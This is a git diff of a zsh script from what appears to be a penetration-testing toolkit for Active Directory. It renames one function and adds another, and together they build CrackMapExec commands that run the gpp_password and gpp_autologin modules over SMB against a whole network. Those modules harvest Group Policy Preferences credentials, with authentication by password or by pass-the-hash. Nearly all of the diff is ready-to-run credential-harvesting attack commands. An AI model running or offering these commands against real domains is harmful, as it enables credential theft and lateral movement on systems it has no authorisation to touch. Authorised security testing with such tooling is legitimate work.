@@ -14,7 +14,7 @@ Commands
 --------
 nb-ad-gpp-install         installs dependencies
 nb-ad-gpp-msf             use metasploit module to look for the cPassword
-nb-ad-gpp-cme
+nb-ad-gpp-cme-password
 nb-ad-gpp-cme-autologin
 
 DOC
@@ -49,7 +49,7 @@ nb-ad-gpp-msf() {
     print -z "msfconsole -n -q -r \"$rc_file\" "
 }
 
-nb-ad-gpp-cme() {
+nb-ad-gpp-cme-password() {
     __check-project
     __check-network
 	  __check-user
@@ -63,12 +63,38 @@ nb-ad-gpp-cme() {
         echo
         __ask "Enter a password for authentication"
         __check-pass
-        print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -d ${__DOMAIN} -p ${__PASS} -M gpp_password | tee -a $(__netadpath)/cme-sweep.txt"
+        print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -d ${__DOMAIN} -p ${__PASS} -M gpp_password | tee -a $(__netadpath)/cme-GPP-password.txt"
     elif [[ $login == "h" ]]; then
         echo
         __ask "Enter the NT:LM hash for authentication"
         __check-hash
-        print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -H ${__HASH} --local-auth -M gpp_password | tee -a $(__netadpath)/cme-sweep.txt"
+        print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -H ${__HASH} --local-auth -M gpp_password | tee -a $(__netadpath)/cme-GPP-password.txt"
+    else
+        echo
+        __err "Invalid option. Please choose 'p' for password or 'h' for hash."
+    fi
+}
+
+nb-ad-gpp-cme-autologin() {
+    __check-project
+    __check-network
+	  __check-user
+    __check-domain
+    echo
+
+    __ask "Do you want to log in using a password or a hash? (p/h)"
+    local login && __askvar login "LOGIN_OPTION"
+
+    if [[ $login == "p" ]]; then
+        echo
+        __ask "Enter a password for authentication"
+        __check-pass
+        print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -d ${__DOMAIN} -p ${__PASS} -M gpp_autologin | tee -a $(__netadpath)/cme-GPP-autologin.txt"
+    elif [[ $login == "h" ]]; then
+        echo
+        __ask "Enter the NT:LM hash for authentication"
+        __check-hash
+        print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -H ${__HASH} --local-auth -M gpp_autologin | tee -a $(__netadpath)/cme-GPP-autologin.txt"
     else
         echo
         __err "Invalid option. Please choose 'p' for password or 'h' for hash."
